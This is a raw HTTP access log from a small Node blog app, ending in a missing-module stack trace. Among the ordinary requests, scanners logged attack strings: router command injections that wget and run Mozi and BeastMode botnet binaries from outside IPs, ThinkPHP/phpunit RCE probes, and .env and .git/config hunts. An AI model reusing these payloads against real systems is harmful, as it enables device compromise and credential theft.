[0mGET /.env [33m404 [0m0.917 ms - 1418[0m
[0mPOST / [33m404 [0m1.063 ms - 1413[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.952 ms - 1418[0m
[0mGET / [32m200 [0m0.896 ms - 1934[0m
[0mGET / [32m200 [0m0.821 ms - 1934[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.758 ms - 1934[0m
[0mGET /portal/redlion [33m404 [0m0.964 ms - 1418[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.881 ms - 1934[0m
[0mGET / [32m200 [0m3.126 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.948 ms - 1418[0m
[0mGET / [32m200 [0m0.957 ms - 1934[0m
[0mHEAD / [32m200 [0m0.892 ms - 1934[0m
[0mGET / [32m200 [0m1.852 ms - 1934[0m
[0mGET /nmaplowercheck1602383540 [33m404 [0m1.457 ms - 1418[0m
[0mGET / [32m200 [0m0.840 ms - 1934[0m
[0mGET /evox/about [33m404 [0m0.761 ms - 1418[0m
[0mGET /HNAP1 [33m404 [0m0.982 ms - 1418[0m
[0mPOST /sdk [33m404 [0m0.762 ms - 1413[0m
[0mGET / [32m200 [0m0.940 ms - 1934[0m
[0mGET / [32m200 [0m0.833 ms - 1934[0m
[0mPOST /HNAP1/ [33m404 [0m0.845 ms - 1413[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://39.79.138.6:41909/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.857 ms - 1418[0m
[0mGET http://163.172.88.110:41298/1.txt [33m404 [0m1.002 ms - 1418[0m
[0mGET http://163.172.88.110:41298/1.txt [33m404 [0m0.926 ms - 1418[0m
[0mGET http://163.172.88.110:41298/1.txt [33m404 [0m0.957 ms - 1418[0m
[0mGET / [32m200 [0m0.879 ms - 1934[0m
[0mPOST /api/jsonws/invoke [33m404 [0m1.006 ms - 1413[0m
[0mGET / [32m200 [0m0.795 ms - 1934[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.726 ms - 1413[0m
[0mGET /.env [33m404 [0m0.874 ms - 1418[0m
[0mPOST / [33m404 [0m1.915 ms - 1413[0m
[0mGET / [32m200 [0m0.961 ms - 1934[0m
[0mGET / [32m200 [0m0.802 ms - 1934[0m
[0mGET / [32m200 [0m0.841 ms - 1934[0m
[0mGET / [32m200 [0m0.614 ms - 1934[0m
[0mGET /.env [33m404 [0m0.868 ms - 1418[0m
[0mPOST / [33m404 [0m0.896 ms - 1413[0m
[0mGET / [32m200 [0m0.950 ms - 1934[0m
[0mGET / [32m200 [0m0.877 ms - 1934[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m1.773 ms - 1418[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.823 ms - 1934[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.817 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.961 ms - 1418[0m
[0mGET / [32m200 [0m0.829 ms - 1934[0m
[0mGET /muieblackcat [33m404 [0m1.040 ms - 1418[0m
[0mGET //phpMyAdmin/scripts/setup.php [33m404 [0m0.948 ms - 1418[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m0.926 ms - 1418[0m
[0mGET //pma/scripts/setup.php [33m404 [0m0.950 ms - 1418[0m
[0mGET //myadmin/scripts/setup.php [33m404 [0m1.673 ms - 1418[0m
[0mGET //MyAdmin/scripts/setup.php [33m404 [0m0.978 ms - 1418[0m
[0mGET //Admin/scripts/setup.php [33m404 [0m0.968 ms - 1418[0m
[0mGET //mysql/scripts/setup.php/db/scripts/setup.php/typo3/phpmyadmin/scripts/setup.php/web/phpMyAdmin/scripts/setup.php/web/scripts/setup.php/phpmyadmin2/scripts/setup.php/admin/scripts/setup.php/admin/phpmyadmin/scripts/setup.php/phpmyadmin1/scripts/setup.php/xampp/phpmyadmin/scripts/setup.php/php-my-admin/scripts/setup.php [33m404 [0m0.997 ms - 1418[0m
[0mGET / [32m200 [0m0.825 ms - 1934[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://42.225.41.64:48949/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.003 ms - 1418[0m
[0mGET / [32m200 [0m0.795 ms - 1934[0m
[0mPOST /api/jsonws/invoke [33m404 [0m4.779 ms - 1413[0m
[0mHEAD /robots.txt [33m404 [0m0.899 ms - 1418[0m
[0mGET / [32m200 [0m1.704 ms - 1934[0m
[0mGET / [32m200 [0m0.864 ms - 1934[0m
[0mGET / [32m200 [0m0.868 ms - 1934[0m
[0mGET / [32m200 [0m0.798 ms - 1934[0m
[0mGET /.env [33m404 [0m0.940 ms - 1418[0m
[0mGET /vendor/.env [33m404 [0m0.867 ms - 1418[0m
[0mGET /storage/.env [33m404 [0m0.865 ms - 1418[0m
[0mGET /public/.env [33m404 [0m0.893 ms - 1418[0m
[0mPOST / [33m404 [0m3.077 ms - 1413[0m
[0mGET /.env [33m404 [0m1.735 ms - 1418[0m
[0mPOST / [33m404 [0m1.006 ms - 1413[0m
[0mGET / [32m200 [0m0.887 ms - 1934[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.006 ms - 1418[0m
[0mGET / [32m200 [0m0.830 ms - 1934[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.988 ms - 1413[0m
[0mGET / [32m200 [0m0.843 ms - 1934[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+192.210.239.115/beastmode/b3astmode.arm7;chmod+777+/tmp/b3astmode.arm7;sh+/tmp/b3astmode.arm7+BeastMode.Rep.Jaws [0m- [0m- ms - -[0m
[0mGET / [32m200 [0m0.865 ms - 1934[0m
[0mGET / [32m200 [0m1.800 ms - 1934[0m
[0mGET / [32m200 [0m0.820 ms - 1934[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.966 ms - 1418[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m0.966 ms - 1418[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m0.934 ms - 1418[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m0.949 ms - 1418[0m
[0mGET /pma/scripts/setup.php [33m404 [0m0.959 ms - 1418[0m
[0mGET /myadmin/scripts/setup.php [33m404 [0m0.899 ms - 1418[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m0.928 ms - 1418[0m
[0mGET / [32m200 [0m1.787 ms - 1934[0m
[0mGET / [32m200 [0m0.757 ms - 1934[0m
[0mGET / [32m200 [0m0.898 ms - 1934[0m
[0mGET /boaform/admin/formLogin?username=admin&psd=admin [33m404 [0m1.011 ms - 1418[0m
[0mGET / [32m200 [0m0.762 ms - 1934[0m
[0mGET / [32m200 [0m0.796 ms - 1934[0m
[0mGET /hudson [33m404 [0m1.008 ms - 1418[0m
[0mGET / [32m200 [0m0.880 ms - 1934[0m
[0mGET / [32m200 [0m0.856 ms - 1934[0m
[0mGET / [32m200 [0m1.672 ms - 1934[0m
[0mGET / [32m200 [0m0.796 ms - 1934[0m
[0mGET / [32m200 [0m0.839 ms - 1934[0m
[0mHEAD / [32m200 [0m0.792 ms - 1934[0m
[0mGET / [32m200 [0m0.909 ms - 1934[0m
[0mGET /.env [33m404 [0m0.906 ms - 1418[0m
[0mGET /v2/_catalog [33m404 [0m0.991 ms - 1418[0m
[0mGET / [32m200 [0m1.194 ms - 1934[0m
[0mGET /.git/config [33m404 [0m1.628 ms - 1418[0m
[0mGET / [32m200 [0m1.838 ms - 1934[0m
[0mGET / [32m200 [0m0.853 ms - 1934[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.955 ms - 1418[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.841 ms - 1934[0m
[0mGET / [32m200 [0m0.848 ms - 1934[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.790 ms - 1934[0m
[0mGET /boaform/admin/formLogin?username=user&psd=user [33m404 [0m0.987 ms - 1418[0m
[0mGET / [32m200 [0m0.873 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m1.014 ms - 1418[0m
[0mGET / [32m200 [0m1.664 ms - 1934[0m
[0mGET http://www.proxylists.net/proxyjudge.php [33m404 [0m1.340 ms - 1418[0m
[0mGET / [32m200 [0m0.942 ms - 1934[0m
[0mGET / [32m200 [0m0.851 ms - 1934[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.960 ms - 1413[0m
[0mGET / [32m200 [0m0.928 ms - 1934[0m
[0mGET http://163.172.88.110:41298/1.txt [33m404 [0m0.954 ms - 1418[0m
[0mGET http://163.172.88.110:41298/1.txt [33m404 [0m0.944 ms - 1418[0m
[0mGET http://163.172.88.110:41298/1.txt [33m404 [0m0.955 ms - 1418[0m
[0mGET / [32m200 [0m0.823 ms - 1934[0m
[0mGET / [32m200 [0m1.669 ms - 1934[0m
[0mGET /admin/config.php?password%5B0%5D=admin&username=admin [33m404 [0m0.925 ms - 1418[0m
[0mGET / [32m200 [0m0.899 ms - 1934[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.770 ms - 1413[0m
[0mGET / [32m200 [0m0.841 ms - 1934[0m
[0mGET / [32m200 [0m0.897 ms - 1934[0m
[0mGET / [32m200 [0m0.849 ms - 1934[0m
[0mGET / [32m200 [0m0.861 ms - 1934[0m
[0mGET / [32m200 [0m1.736 ms - 1934[0m
[0mGET / [32m200 [0m0.675 ms - 1934[0m
[0mGET / [32m200 [0m0.828 ms - 1934[0m
[0mGET /favicon.ico [33m404 [0m0.966 ms - 1418[0m
[0mGET /blogadd [32m200 [0m1.425 ms - 1953[0m
[0mGET /images/construction.gif [32m200 [0m1.487 ms - 16429[0m
[0mGET /bloglist [32m200 [0m1.746 ms - 4518[0m
[0mGET /images/postImage.png [32m200 [0m2.178 ms - 170047[0m
[0mGET /blogedit [32m200 [0m3.693 ms - 1994[0m
[0mGET /images/construction.gif [36m304 [0m0.436 ms - -[0m
[0mGET /blogdelete [32m200 [0m5.123 ms - 1920[0m
[0mGET /images/construction.gif [36m304 [0m0.465 ms - -[0m
[0mGET / [36m304 [0m0.839 ms - -[0m
[0mGET /blogadd [36m304 [0m0.908 ms - -[0m
[0mGET /images/construction.gif [36m304 [0m0.414 ms - -[0m
[0mGET /bloglist [36m304 [0m2.759 ms - -[0m
[0mGET /images/postImage.png [36m304 [0m0.385 ms - -[0m
[0mGET /blogedit [36m304 [0m1.158 ms - -[0m
[0mGET /images/construction.gif [36m304 [0m0.392 ms - -[0m
[0mGET /blogdelete [36m304 [0m0.904 ms - -[0m
[0mGET /images/construction.gif [36m304 [0m0.339 ms - -[0m
[0mGET /blogadd [36m304 [0m1.707 ms - -[0m
[0mGET /images/construction.gif [36m304 [0m0.390 ms - -[0m
[0mGET /blogdelete [36m304 [0m0.894 ms - -[0m
[0mGET /images/construction.gif [36m304 [0m0.351 ms - -[0m
[0mGET /blogedit [36m304 [0m0.880 ms - -[0m
[0mGET /images/construction.gif [36m304 [0m0.385 ms - -[0m
[0mGET / [36m304 [0m5.106 ms - -[0m
[0mGET / [32m200 [0m0.984 ms - 1955[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.951 ms - 1418[0m
[0mPOST /goform/webLogin [33m404 [0m0.948 ms - 1413[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m1.852 ms - 1955[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.881 ms - 1955[0m
[0mGET / [32m200 [0m0.846 ms - 1955[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.871 ms - 1418[0m
[0mGET /portal/redlion [33m404 [0m0.935 ms - 1418[0m
[0mGET / [32m200 [0m4.922 ms - 1955[0m
[0mGET / [32m200 [0m0.887 ms - 1955[0m
[0mGET / [32m200 [0m0.874 ms - 1955[0m
[0mGET / [32m200 [0m1.674 ms - 1955[0m
[0mGET / [32m200 [0m0.851 ms - 1955[0m
[0mGET / [32m200 [0m0.799 ms - 1955[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.908 ms - 1413[0m
[0mGET / [36m304 [0m0.879 ms - -[0m
[0mGET / [32m200 [0m8.071 ms - 119958[0m
[0mGET /EmmanouilRichman/blog/security/overall-count [33m404 [0m7.206 ms - 112200[0m
[0mGET /EmmanouilRichman/blog/contributors/Lab4/app_server/views/home.ejs [33m404 [0m6.477 ms - 112200[0m
[0mGET /socket-worker.js [33m404 [0m5.248 ms - 112200[0m
[0mGET /users/mslint/feature_preview/indicator_check [33m404 [0m5.375 ms - 112200[0m
[0mGET /opensearch.xml [33m404 [0m5.433 ms - 112200[0m
[0mGET /users/EmmanouilRichman/hovercard?subject=repository%3A294843747&current_path=%2F [33m404 [0m5.684 ms - 112200[0m
[0mGET /users/EmmanouilRichman/hovercard?subject=repository%3A294843747&current_path=%2F [33m404 [0m5.790 ms - 112200[0m
[0mGET /bloglist [32m200 [0m10.117 ms - 128201[0m
[0mGET /EmmanouilRichman/blog/contributors/Lab4/app_server/views/blog-list.ejs [33m404 [0m5.686 ms - 112200[0m
[0mGET /EmmanouilRichman/blog/security/overall-count [33m404 [0m6.314 ms - 112200[0m
[0mGET /users/mslint/feature_preview/indicator_check [33m404 [0m5.081 ms - 112200[0m
[0mGET /socket-worker.js [33m404 [0m4.724 ms - 112200[0m
[0mGET /users/EmmanouilRichman/hovercard?subject=repository%3A294843747&current_path=%2Fbloglist [33m404 [0m5.160 ms - 112200[0m
[0mGET / [32m200 [0m7.213 ms - 119958[0m
[0mGET / [32m200 [0m5.320 ms - 119958[0m
[0mGET /blogedit [31m500 [0m4.672 ms - 2495[0m
[0mGET /bloglist [31m500 [0m2.185 ms - 2242[0m
[0mGET /blogdelete [31m500 [0m6.746 ms - 2517[0m
[0mGET /blogedit [31m500 [0m7.141 ms - 2495[0m
[0mGET / [32m200 [0m1.364 ms - 2183[0m
[0mGET /stylesheets/style.css [32m200 [0m1.588 ms - 4661[0m
[0mGET /blogadd [32m200 [0m2.157 ms - 2596[0m
[0mGET /stylesheets/style.css [36m304 [0m0.479 ms - -[0m
[0mGET /bloglist [31m500 [0m1.908 ms - 2242[0m
[0mGET /bloglist [31m500 [0m1.567 ms - 2242[0m
[0mGET / [36m304 [0m1.240 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.431 ms - -[0m
[0mGET / [36m304 [0m1.060 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.523 ms - -[0m
[0mGET /blogadd [36m304 [0m1.292 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.431 ms - -[0m
[0mPOST /blogadd [33m404 [0m1.171 ms - 1412[0m
[0mGET /bloglist [31m500 [0m1.501 ms - 2242[0m
[0mGET / [36m304 [0m11.883 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.472 ms - -[0m
[0mGET / [32m200 [0m1.294 ms - 2449[0m
[0mGET /stylesheets/style.css [36m304 [0m0.491 ms - -[0m
[0mGET /blogadd [32m200 [0m1.325 ms - 2862[0m
[0mGET /stylesheets/style.css [36m304 [0m0.371 ms - -[0m
[0mGET /bloglist [31m500 [0m1.874 ms - 2242[0m
[0mGET /blogedit [31m500 [0m1.734 ms - 2495[0m
[0mGET /blogdelete [31m500 [0m1.794 ms - 2517[0m
[0mGET /blogadd [36m304 [0m1.360 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.416 ms - -[0m
[0mGET /blogadd [36m304 [0m1.831 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.434 ms - -[0m
[0mGET /bloglist [31m500 [0m1.883 ms - 2242[0m
[0mGET /bloglist [31m500 [0m1.475 ms - 2242[0m
[0mGET /bloglist [31m500 [0m1.570 ms - 2242[0m
[0mGET /bloglist [31m500 [0m1.555 ms - 2242[0m
[0mGET /bloglist [31m500 [0m1.445 ms - 1960[0m
[0mGET /bloglist [31m500 [0m1.850 ms - 2396[0m
[0mGET /blogdelete [31m500 [0m1.823 ms - 2517[0m
[0mGET /bloglist [31m500 [0m1.884 ms - 2396[0m
[0mGET /blogedit [31m500 [0m1.738 ms - 2495[0m
[0mGET /blogdelete [31m500 [0m2.305 ms - 2517[0m
[0mGET /blogedit [31m500 [0m1.511 ms - 2495[0m
[0mGET /blogedit [31m500 [0m1.447 ms - 2495[0m
[0mGET /bloglist [31m500 [0m1.890 ms - 2281[0m
[0mGET /blogedit [31m500 [0m1.548 ms - 2495[0m
[0mGET /blogedit [31m500 [0m2.170 ms - 2495[0m
[0mGET /bloglist [31m500 [0m1.836 ms - 2281[0m
[0mGET /bloglist [31m500 [0m2.400 ms - 2430[0m
[0mGET /bloglist [31m500 [0m1.841 ms - 2256[0m
[0mGET /bloglist [31m500 [0m6.731 ms - 2256[0m
[0mGET /bloglist [31m500 [0m2.061 ms - 2256[0m
[0mGET /bloglist [31m500 [0m1.394 ms - 2256[0m
[0mGET / [32m200 [0m5.072 ms - 2449[0m
[0mGET /bloglist [31m500 [0m1.406 ms - 2256[0m
[0mGET /bloglist [31m500 [0m1.467 ms - 2256[0m
[0mGET /blogedit [31m500 [0m1.476 ms - 2495[0m
[0mGET /blogdelete [31m500 [0m2.122 ms - 2517[0m
[0mGET /bloglist [31m500 [0m1.431 ms - 2256[0m
[0mPOST /blogadd [33m404 [0m1.076 ms - 1412[0m
[0mPOST /blogadd [33m404 [0m1.002 ms - 1412[0m
[0mGET /bloglist [31m500 [0m1.557 ms - 2256[0m
[0mGET /blogedit [31m500 [0m1.464 ms - 2495[0m
[0mGET /blogdelete [31m500 [0m2.228 ms - 2517[0m
[0mGET /blogdelete [31m500 [0m1.389 ms - 2517[0m
[0mGET /blogdelete [31m500 [0m1.459 ms - 2517[0m
internal/modules/cjs/loader.js:969
  throw err;
  ^

Error: Cannot find module 'request'
Require stack:
- /home/bitnami/blog/app_server/controllers/blog.js
- /home/bitnami/blog/app_server/routes/index.js
- /home/bitnami/blog/app.js
- /home/bitnami/blog/bin/www
    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:966:15)
    at Function.Module._load (internal/modules/cjs/loader.js:842:27)
    at Module.require (internal/modules/cjs/loader.js:1026:19)
    at require (internal/modules/cjs/helpers.js:72:18)
    at Object.<anonymous> (/home/bitnami/blog/app_server/controllers/blog.js:1:15)
    at Module._compile (internal/modules/cjs/loader.js:1138:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1158:10)
    at Module.load (internal/modules/cjs/loader.js:986:32)
    at Function.Module._load (internal/modules/cjs/loader.js:879:14)
    at Module.require (internal/modules/cjs/loader.js:1026:19)
    at require (internal/modules/cjs/helpers.js:72:18)
    at Object.<anonymous> (/home/bitnami/blog/app_server/routes/index.js:4:16)
    at Module._compile (internal/modules/cjs/loader.js:1138:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1158:10)
    at Module.load (internal/modules/cjs/loader.js:986:32)
    at Function.Module._load (internal/modules/cjs/loader.js:879:14) {
  code: 'MODULE_NOT_FOUND',
  requireStack: [
    '/home/bitnami/blog/app_server/controllers/blog.js',
    '/home/bitnami/blog/app_server/routes/index.js',
    '/home/bitnami/blog/app.js',
    '/home/bitnami/blog/bin/www'
  ]
}
